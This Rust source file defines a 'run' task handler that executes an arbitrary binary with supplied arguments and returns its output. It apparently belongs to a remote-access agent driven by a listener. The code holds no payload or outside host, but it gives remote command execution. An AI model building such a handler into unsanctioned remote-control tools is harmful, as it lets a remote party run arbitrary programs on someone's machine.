use crate::internal::listener::{TaskHandler};
use std::process;

pub static COMMAND: &str = "run";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() == 0  {
            return Ok("Invalid number of arguments received. Usage: 'run [binary] <optional: arguments>'.".to_string());
        }

        let target = args.first().unwrap();

        if target.is_empty() {
            return Ok("[ERROR] Please provide a binary to run.".to_string());
        }

        let target_args: &[std::string::String] = match args.len() {
            0 => &[],
            _ => &args[1..],
        };

        let command_output = process::Command::new(target).args(target_args).output()?;
        let mut output = format!("\nOutput for '{} {}'.\n", target.clone(), target_args.clone().join(" "));
        output.push_str(format!("{:-<40}\n", "").as_str());

        match command_output.status.success() {
            true => output.push_str(String::from_utf8(command_output.stdout)?.as_str()),
            false => output.push_str(String::from_utf8(command_output.stderr)?.as_str())
        };

        return Ok(output);
    }
}